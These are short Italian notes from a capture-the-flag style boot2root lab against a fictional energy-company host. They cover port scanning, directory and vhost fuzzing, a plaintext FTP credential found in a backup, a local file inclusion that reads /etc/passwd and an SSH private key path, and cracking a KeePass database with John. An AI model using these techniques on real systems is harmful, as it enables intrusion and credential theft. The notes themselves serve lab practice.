# boot 2 root
# B2R01
```bash
nmap -sT 192.168.14.27 --exclude-ports 65432
```

ottengo 4 porte

## B2R02
```bash
gobuster dir -u https://192.168.14.27/ -w wordlist -k
```


```bash
└─$ cat Downloads/temp5712837.bak 
[DEPRECATED FTP CONFIG]
USER=muntrea-filemanager
PASS=Muntrea2026!
REMOTE_PATH=/backup/manuals
STAMP=20260513
```

```txt
/v1/adm1n/d4shb0ard/
```


```
https://muntrea-energy.vdsi/
```


```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u https://muntrea-energy.vdsi/ -H "HOST: FUZZ.muntrea-energy.vdsi" -fs 1950
```

ottienamo che il `vhost` e' `control`


```url
https://control.muntrea-energy.vdsi/v1/adm1n/d4shb0ard/?page=plant&plant_id=sections/reactor-1
```
* `plant_id` e' il parametro

```bash
https://control.muntrea-energy.vdsi/v1/adm1n/d4shb0ard/?page=plant&plant_id=/etc/passwd
```


```
### /home/muntrea-operator/.ssh/id_rsa
```

# STDNA
```bash
git clone https://github.com/ivanmrsulja/keepass2john.git
```

```bash
python keepass2john/keepass2john.py secrets.kdbx > secretsjohn.txt
```


```bash
john --single secretsjohn.txt
```

```bash
secrets1901..secrets1900
```